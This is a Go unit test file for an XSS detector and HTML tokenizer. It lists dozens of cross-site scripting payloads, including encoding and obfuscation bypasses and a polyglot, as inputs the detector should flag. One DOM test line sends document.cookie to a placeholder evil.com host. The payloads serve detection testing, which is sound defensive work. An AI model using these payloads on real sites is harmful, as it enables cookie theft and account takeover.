// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (c) 2024-2026 Stevie Bellis. All rights reserved.

package detection

import (
	"testing"
)

func TestXSSDetector_Detect(t *testing.T) {
	detector := NewXSSDetector(false)

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Basic script tags
		{"Basic script tag", "<script>alert(1)</script>", true},
		{"Script with src", "<script src='http://evil.com/xss.js'></script>", true},
		{"Script with type", "<script type='text/javascript'>alert(1)</script>", true},
		{"Self-closing script", "<script/>", true},
		{"Script with spaces", "< script >alert(1)</ script >", true},

		// Event handlers
		{"onclick", "<div onclick='alert(1)'>Click me</div>", true},
		{"onload", "<body onload='alert(1)'>", true},
		{"onerror", "<img src=x onerror='alert(1)'>", true},
		{"onmouseover", "<a onmouseover='alert(1)'>Hover</a>", true},
		{"onfocus", "<input onfocus='alert(1)' autofocus>", true},
		{"onblur", "<input onblur='alert(1)'>", true},
		{"onsubmit", "<form onsubmit='alert(1)'>", true},
		{"ondblclick", "<div ondblclick='alert(1)'>", true},

		// JavaScript protocol
		{"JavaScript href", "<a href='javascript:alert(1)'>Click</a>", true},
		{"JavaScript with spaces", "<a href='java script:alert(1)'>Click</a>", true},
		{"JavaScript encoded", "<a href='&#x6A;avascript:alert(1)'>Click</a>", true},
		{"vbscript", "<a href='vbscript:msgbox(1)'>Click</a>", true},

		// SVG-based XSS
		{"SVG onload", "<svg onload='alert(1)'>", true},
		{"SVG inline script", "<svg><script>alert(1)</script></svg>", true},
		{"SVG with animate", "<svg><animate onbegin='alert(1)'>", true},

		// IMG-based XSS
		{"IMG onerror", "<img src=x onerror=alert(1)>", true},
		{"IMG onload", "<img src=valid.png onload=alert(1)>", true},
		{"IMG javascript src", "<img src='javascript:alert(1)'>", true},
		{"IMG dynsrc", "<img dynsrc='javascript:alert(1)'>", true},

		// IFRAME injection
		{"Basic iframe", "<iframe src='http://evil.com'>", true},
		{"iframe srcdoc", "<iframe srcdoc='<script>alert(1)</script>'>", true},
		{"iframe javascript", "<iframe src='javascript:alert(1)'>", true},

		// Object/Embed
		{"Object tag", "<object data='http://evil.com/xss.swf'>", true},
		{"Embed tag", "<embed src='http://evil.com/xss.swf'>", true},
		{"Applet tag", "<applet code='evil.class'>", true},

		// Style-based XSS
		{"Style expression", "<div style='width:expression(alert(1))'>", true},
		{"Style tag", "<style>body{background:url('javascript:alert(1)')}</style>", true},
		{"Style behavior", "<div style='behavior:url(xss.htc)'>", true},
		{"Moz binding", "<div style='-moz-binding:url(xss.xml)'>", true},

		// Form-based XSS
		{"Form action javascript", "<form action='javascript:alert(1)'>", true},
		{"Button formaction", "<button formaction='javascript:alert(1)'>", true},

		// Input-based XSS
		{"Input autofocus", "<input autofocus onfocus='alert(1)'>", true},
		{"Input type image", "<input type='image' src='x' onerror='alert(1)'>", true},

		// Meta redirect
		{"Meta refresh", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", true},
		{"Meta set-cookie", "<meta http-equiv='set-cookie' content='test=value'>", true},

		// Base tag hijacking
		{"Base tag", "<base href='http://evil.com/'>", true},

		// DOM manipulation
		{"document.cookie", "document.cookie", true},
		{"document.write", "document.write('<script>')", true},
		{"innerHTML", "element.innerHTML = '<script>'", true},
		{"eval", "eval('alert(1)')", true},
		{"setTimeout string", "setTimeout('alert(1)', 1000)", true},
		{"setInterval string", "setInterval('alert(1)', 1000)", true},

		// Template injection
		{"Angular template", "{{constructor.constructor('alert(1)')()}}", true},
		{"Template literal", "${alert(1)}", true},
		{"ERB template", "<%=alert(1)%>", true},

		// Encoding bypass - URL encoding
		{"URL encoded script", "%3Cscript%3Ealert(1)%3C/script%3E", true},
		{"Double URL encoded", "%253Cscript%253Ealert(1)%253C/script%253E", true},

		// Encoding bypass - HTML entities
		{"HTML entity lt", "&lt;script&gt;alert(1)&lt;/script&gt;", true},
		{"Numeric entity", "&#60;script&#62;alert(1)&#60;/script&#62;", true},
		{"Hex entity", "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", true},

		// Encoding bypass - Unicode
		{"Unicode escape", "\\u003cscript\\u003ealert(1)", true},
		{"Hex escape", "\\x3cscript\\x3ealert(1)", true},

		// Obfuscation
		{"fromCharCode", "String.fromCharCode(60,115,99,114,105,112,116,62)", true},
		{"atob", "eval(atob('YWxlcnQoMSk='))", true},
		{"unescape", "unescape('%3Cscript%3E')", true},
		{"constructor abuse", "[].constructor.constructor('alert(1)')()", true},

		// HTML5 specific vectors
		{"Details ontoggle", "<details ontoggle='alert(1)' open>", true},
		{"Video", "<video src=x onerror='alert(1)'>", true},
		{"Audio", "<audio src=x onerror='alert(1)'>", true},
		{"Source onerror", "<video><source onerror='alert(1)'>", true},
		{"Marquee", "<marquee onstart='alert(1)'>", true},
		{"Math", "<math><maction actiontype='toggle'><mrow>", true},

		// Data URI
		{"Data URI HTML", "<a href='data:text/html,<script>alert(1)</script>'>", true},
		{"Data URI base64", "<a href='data:text/html;base64,PHNjcmlwdD4='>", true},

		// Clean inputs - should NOT be detected
		{"Normal text", "Hello, how are you today?", false},
		{"HTML paragraph", "<p>This is a paragraph</p>", false},
		{"Safe link", "<a href='https://example.com'>Link</a>", false},
		{"Email", "user@example.com", false},
		{"Less than comparison", "if (a < b) return true", false},
		{"JSON data", `{"name": "John", "age": 30}`, false},
		{"Math expression", "2 < 3 && 4 > 3", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Detect(tt.input)
			if result != tt.expected {
				t.Errorf("Detect(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestXSSDetector_DetectWithDetails(t *testing.T) {
	detector := NewXSSDetector(true)

	tests := []struct {
		name         string
		input        string
		wantDetected bool
		wantScoreMin int
		wantMatchMin int
	}{
		{
			name:         "Script with event handlers",
			input:        "<script>alert(1)</script><img onerror='alert(2)' src=x>",
			wantDetected: true,
			wantScoreMin: 20,
			wantMatchMin: 2,
		},
		{
			name:         "Complex polyglot",
			input:        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
			wantDetected: true,
			wantScoreMin: 30,
			wantMatchMin: 3,
		},
		{
			name:         "DOM XSS vector",
			input:        "document.location='http://evil.com/steal?cookie='+document.cookie",
			wantDetected: true,
			wantScoreMin: 15,
			wantMatchMin: 1,
		},
		{
			name:         "Clean HTML",
			input:        "<div class='container'><p>Hello World</p></div>",
			wantDetected: false,
			wantScoreMin: 0,
			wantMatchMin: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectWithDetails(tt.input)
			if result.Detected != tt.wantDetected {
				t.Errorf("DetectWithDetails().Detected = %v, want %v", result.Detected, tt.wantDetected)
			}
			if result.Score < tt.wantScoreMin {
				t.Errorf("DetectWithDetails().Score = %d, want >= %d", result.Score, tt.wantScoreMin)
			}
			if len(result.Matches) < tt.wantMatchMin {
				t.Errorf("len(DetectWithDetails().Matches) = %d, want >= %d", len(result.Matches), tt.wantMatchMin)
			}
		})
	}
}

func TestXSSDetector_StrictMode(t *testing.T) {
	normalDetector := NewXSSDetector(false)
	strictDetector := NewXSSDetector(true)

	// Test that strict mode catches more cases
	strictOnlyCases := []struct {
		name  string
		input string
	}{
		{"Partial script tag", "<script"},
		{"Unclosed tag", "<img src="},
		{"Suspicious attribute pattern", "data-onclick=test"},
	}

	for _, tt := range strictOnlyCases {
		t.Run(tt.name, func(t *testing.T) {
			normalResult := normalDetector.Detect(tt.input)
			strictResult := strictDetector.Detect(tt.input)
			t.Logf("Input: %q, Normal: %v, Strict: %v", tt.input, normalResult, strictResult)
		})
	}
}

func TestHTMLTokenizer(t *testing.T) {
	tokenizer := NewHTMLTokenizer()

	tests := []struct {
		name       string
		input      string
		wantTokens int
	}{
		{"Simple tag", "<div>Hello</div>", 3},
		{"Self-closing tag", "<br/>", 1},
		{"Tag with attributes", "<a href='test'>Link</a>", 3},
		{"Comment", "<!-- comment -->", 1},
		{"Mixed content", "<p>Text<br/>More</p>", 5},
		{"Empty input", "", 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tokens := tokenizer.Tokenize(tt.input)
			if len(tokens) < tt.wantTokens {
				t.Errorf("Tokenize(%q) produced %d tokens, want >= %d", tt.input, len(tokens), tt.wantTokens)
			}
		})
	}
}

func TestHTMLTokenizer_AttributeExtraction(t *testing.T) {
	tokenizer := NewHTMLTokenizer()

	input := `<a href="http://example.com" onclick="alert(1)" class="link">Test</a>`
	tokens := tokenizer.Tokenize(input)

	// Find the opening tag
	var openingTag *HTMLToken
	for i := range tokens {
		if tokens[i].Type == HTMLTokenOpenTag && tokens[i].TagName == "a" {
			openingTag = &tokens[i]
			break
		}
	}

	if openingTag == nil {
		t.Fatal("Opening tag not found")
	}

	expectedAttrs := []string{"href", "onclick", "class"}
	for _, attr := range expectedAttrs {
		if _, ok := openingTag.Attributes[attr]; !ok {
			t.Errorf("Attribute %q not found in token", attr)
		}
	}
}

func TestXSSDetector_IsEventHandler(t *testing.T) {
	detector := NewXSSDetector(false)

	eventHandlers := []string{
		"onclick", "onload", "onerror", "onmouseover", "onfocus",
		"onblur", "onsubmit", "onkeydown", "onkeyup", "onkeypress",
	}

	for _, handler := range eventHandlers {
		if !detector.IsEventHandler(handler) {
			t.Errorf("IsEventHandler(%q) = false, want true", handler)
		}
	}

	nonHandlers := []string{"class", "id", "style", "href", "src"}
	for _, attr := range nonHandlers {
		if detector.IsEventHandler(attr) {
			t.Errorf("IsEventHandler(%q) = true, want false", attr)
		}
	}
}

func TestXSSDetector_IsDangerousTag(t *testing.T) {
	detector := NewXSSDetector(false)

	dangerousTags := []string{
		"script", "iframe", "frame", "object", "embed",
		"applet", "svg", "math", "style", "link", "base",
	}

	for _, tag := range dangerousTags {
		if !detector.IsDangerousTag(tag) {
			t.Errorf("IsDangerousTag(%q) = false, want true", tag)
		}
	}

	safeTags := []string{"div", "span", "p", "h1", "ul", "li", "table", "tr", "td"}
	for _, tag := range safeTags {
		if detector.IsDangerousTag(tag) {
			t.Errorf("IsDangerousTag(%q) = true, want false", tag)
		}
	}
}

func TestXSSDetector_HasDangerousAttribute(t *testing.T) {
	detector := NewXSSDetector(false)

	tests := []struct {
		name     string
		attrs    map[string]string
		expected bool
	}{
		{"onclick handler", map[string]string{"onclick": "alert(1)"}, true},
		{"onerror handler", map[string]string{"onerror": "alert(1)"}, true},
		{"src attribute", map[string]string{"src": "javascript:alert(1)"}, true},
		{"srcdoc attribute", map[string]string{"srcdoc": "<script>"}, true},
		{"formaction", map[string]string{"formaction": "test"}, true},
		{"safe attributes", map[string]string{"class": "btn", "id": "submit"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.HasDangerousAttribute(tt.attrs)
			if result != tt.expected {
				t.Errorf("HasDangerousAttribute(%v) = %v, want %v", tt.attrs, result, tt.expected)
			}
		})
	}
}

func TestXSSDetector_SanitizeBasic(t *testing.T) {
	detector := NewXSSDetector(false)

	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "Remove script tags",
			input: "<script>alert(1)</script><p>Safe content</p>",
		},
		{
			name:  "Remove event handlers",
			input: "<div onclick='alert(1)'>Click me</div>",
		},
		{
			name:  "Remove javascript: URLs",
			input: "<a href='javascript:alert(1)'>Click</a>",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.SanitizeBasic(tt.input)
			// Verify dangerous content is removed
			if detector.Detect(result) {
				t.Logf("Warning: Sanitized content still detects XSS: %q -> %q", tt.input, result)
			}
		})
	}
}

func TestXSSDetector_ExtractScriptContent(t *testing.T) {
	detector := NewXSSDetector(false)

	input := "<script>alert(1)</script><p>Text</p><script>console.log('test')</script>"
	scripts := detector.ExtractScriptContent(input)

	if len(scripts) != 2 {
		t.Errorf("ExtractScriptContent() returned %d scripts, want 2", len(scripts))
	}

	if len(scripts) > 0 && scripts[0] != "alert(1)" {
		t.Errorf("First script = %q, want %q", scripts[0], "alert(1)")
	}
}

func TestXSSDetector_DetectDOMXSS(t *testing.T) {
	detector := NewXSSDetector(false)

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"document.write", "document.write('<script>')", true},
		{"innerHTML assignment", "element.innerHTML = userInput", true},
		{"eval call", "eval(userInput)", true},
		{"location assignment", "location = 'http://evil.com'", true},
		{"setTimeout with string", "setTimeout(userInput, 1000)", true},
		{"Safe code", "console.log('hello')", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.DetectDOMXSS(tt.input)
			if result != tt.expected {
				t.Errorf("DetectDOMXSS(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestXSSDetector_CalculateXSSComplexity(t *testing.T) {
	detector := NewXSSDetector(false)

	tests := []struct {
		name          string
		input         string
		minComplexity int
	}{
		{"Simple script", "<script>alert(1)</script>", 1},
		{"Encoded", "%3Cscript%3Ealert(1)%3C/script%3E", 1},
		{"Multiple encodings", "&#x3C;script&#x3E;", 1},
		{"Polyglot", "javascript:/*-/*`/*\\`/*'/*\"/**/(onerror=alert)//", 2},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			complexity := detector.CalculateXSSComplexity(tt.input)
			if complexity < tt.minComplexity {
				t.Errorf("CalculateXSSComplexity(%q) = %d, want >= %d", tt.input, complexity, tt.minComplexity)
			}
		})
	}
}

func TestIsControlCharacterAbuse(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"Normal text", "Hello World", false},
		{"With newline", "Hello\nWorld", false},
		{"With tab", "Hello\tWorld", false},
		{"With null byte", "Hello\x00World", true},
		{"With bell", "Hello\x07World", true},
		{"With backspace", "Hello\x08World", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsControlCharacterAbuse(tt.input)
			if result != tt.expected {
				t.Errorf("IsControlCharacterAbuse(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestXSSDetector_GetPatternCount(t *testing.T) {
	detector := NewXSSDetector(false)
	count := detector.GetPatternCount()
	if count < 80 { // Should have many patterns
		t.Errorf("GetPatternCount() = %d, want >= 80", count)
	}
}

func BenchmarkXSSDetector_Detect(b *testing.B) {
	detector := NewXSSDetector(false)
	input := "<script>alert(document.cookie)</script>"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		detector.Detect(input)
	}
}

func BenchmarkXSSDetector_DetectCleanInput(b *testing.B) {
	detector := NewXSSDetector(false)
	input := "<div class='container'><p>This is a normal paragraph with some text.</p></div>"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		detector.Detect(input)
	}
}

func BenchmarkXSSDetector_DetectWithDetails(b *testing.B) {
	detector := NewXSSDetector(true)
	input := "<script>alert(1)</script><img onerror='alert(2)' src=x>"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		detector.DetectWithDetails(input)
	}
}

func BenchmarkHTMLTokenizer_Tokenize(b *testing.B) {
	tokenizer := NewHTMLTokenizer()
	input := `<div class="container"><h1>Title</h1><p class="text">Hello <a href="http://example.com">World</a></p></div>`

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		tokenizer.Tokenize(input)
	}
}
